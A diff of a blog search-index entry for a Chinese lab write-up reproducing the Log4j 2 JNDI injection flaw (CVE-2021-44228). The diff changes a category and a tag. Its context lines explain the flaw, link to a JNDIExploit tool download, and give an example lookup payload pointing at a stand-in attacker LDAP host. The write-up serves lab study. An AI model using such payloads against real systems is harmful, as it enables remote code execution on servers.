@@ -7,6 +7,7 @@
 <p>靶机 ：192.168.129.128_kali</p>
 <p>JNDIExploit.v1.2：链接: <a href="https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w">https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w</a> 提取码: xiao </p>
 <h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p>
+<p><em><span id="more"></span></em></p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
 <li><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>在靶机中使用docker搭建</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
@@ -45,10 +46,10 @@
 <p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810115216079.png" alt="image-20220810115216079"></p>
 ]]></content>
       <categories>
-        <category>文章</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>漏洞复现</tag>
+        <tag>8.11</tag>
       </tags>
   </entry>
 </search>
